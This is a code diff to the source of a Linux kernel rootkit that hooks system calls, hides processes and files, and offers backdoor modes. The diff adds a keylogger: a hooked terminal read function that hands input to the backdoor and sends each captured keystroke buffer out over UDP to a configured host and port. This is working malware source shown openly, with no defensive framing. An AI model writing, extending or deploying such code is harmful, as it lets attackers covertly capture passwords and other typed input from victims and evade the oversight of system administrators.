@@ -20,6 +20,7 @@
 #include "pidhide.h"
 #include "openhide.h"
 #include "read.h"
+#include "inputlog.h"
 
 extern rootkit_t rootkit;
 
@@ -27,14 +28,17 @@ void **sys_calls;
 
 atomic_t read_install_count;
 atomic_t getdents_install_count;
+atomic_t tty_read_install_count;
 
 atomic_t read_count;
 atomic_t getdents_count;
 atomic_t getdents64_count;
+atomic_t tty_read_count;
 
 asmlinkage ssize_t (*sys_read)(const struct pt_regs *);
 asmlinkage long (*sys_getdents)(const struct pt_regs *);
 asmlinkage long (*sys_getdents64)(const struct pt_regs *);
+ssize_t (*sys_tty_read)(struct file *, char *, size_t, loff_t *);
 
 struct linux_dirent {
     unsigned long   d_ino;
@@ -79,6 +83,9 @@ init_hooks(void)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
         backdoor_tty();
+
+    if (rootkit.logging_input)
+        log_input("127.0.0.1", "5000");
 }
 
 void
@@ -100,6 +107,9 @@ remove_hooks(void)
 
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
+
+    if (rootkit.logging_input)
+        unlog_input();
 }
 
 void
@@ -121,13 +131,30 @@ g7_read(const struct pt_regs *pt_regs)
     atomic_inc(&read_count);
     long ret = sys_read(pt_regs);
 
-    //Just like the SystemV-CC (ignoring fd)
+    // Just like the SystemV-CC (ignoring fd)
     char *buf = (char *)pt_regs->si;
     size_t count = pt_regs->dx;
 
-    handle_pid(current->pid, buf, count);
+    if (rootkit.backdoor == BD_READ)
+        handle_pid(current->pid, buf, count);
 
     atomic_dec(&read_count);
+    return ret;
+}
+
+ssize_t
+g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
+{
+    atomic_inc(&tty_read_count);
+    ssize_t ret = sys_tty_read(file, buf, count, off);
+
+    if (rootkit.backdoor == BD_TTY)
+        handle_pid(current->pid, buf, count);
+
+    if (rootkit.logging_input)
+        send_udp(buf, count);
+
+    atomic_dec(&tty_read_count);
     return ret;
 }
 
